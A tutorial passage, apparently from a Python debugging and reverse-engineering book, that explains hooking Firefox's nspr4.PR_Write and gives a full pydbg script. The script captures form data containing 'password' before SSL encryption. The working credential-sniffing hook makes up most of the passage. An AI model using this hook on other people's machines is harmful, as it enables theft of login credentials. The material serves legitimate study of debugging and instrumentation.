
First let’s verify that we can actually see the data we are interested in. Open
the Firefox web browser, and navigate to one of my favorite sites, https://www
.openrce.org/. Once you have accepted the site’s SSL certificate and the page
has loaded, attach Immunity Debugger to the firefox.exe process and set a break-
point on nspr4.PR_Write. In the top-right corner of the OpenRCE website is a
login form; set a username to test and a password to test and click the
Login button. The breakpoint you set should be hit almost immediately;
keep pressing F9 and you’ll continually see the breakpoint being hit.
Eventually, you will see a string pointer on the stack that dereferences to
something like this:
[ESP + 8] => ASCII "username=test&password=test&remember_me=on"


firefox_hook.py
```python:n
from pydbg import *
from pydbg.defines import *

import utils
import sys

dbg = pydbg()
found_firefox = False

# let's set a global pattern that we can make the hook search for
pattern = "password"

# this is our entry hook callback function the argument we are interested in is args[1]
def ssl_sniff(dbg,args):
    # now we read out the memory pointed to by the second argument
    # it is stored as an ASCII string, so we'll loop on a read until we reach a NULL byte
    buffer = ""
    offset = 0
    while 1:
        byte = dbg.read_process_memory(args[1]+offset,1)
        if byte != "\x00":
            buffer += byte
            offset += 1
            continue
        else:
            break

    if pattern in buffer:
        print "Pre-Encrypted: %s" % buffer
    return DBG_CONTINUE

# Quick and dirty process enumeration to find firefox.exe
for (pid,name) in dbg.enumerate_processes():
    if name.lower() == "firefox.exe":
        found_firefox = True
        hooks = utils.hook_container()

        dbg.attach(pid)
        print "[*] Attaching to firefox.exe with PID: %d" % pid

        # Resolve the function address
        hook_address = dbg.func_resolve_debuggee("nspr4.dll","PR_Write")

        if hook_address:
            # Add the hook to the container. We aren't interested in using an exit callback, so we set it to None.
            hooks.add(dbg,hook_address,2,ssl_sniff,None)
            print "[*] nspr4.PR_Write hooked at: 0x%08x" % hook_address
            break
        else:
            print "[*] Error: Couldn't resolve hook address."
            sys.exit(-1)
if found_firefox:
    print "[*] Hooks set, continuing process."
    dbg.run()
else:
    print "[*] Error: Couldn't find the firefox.exe process."
    sys.exit(-1)
```
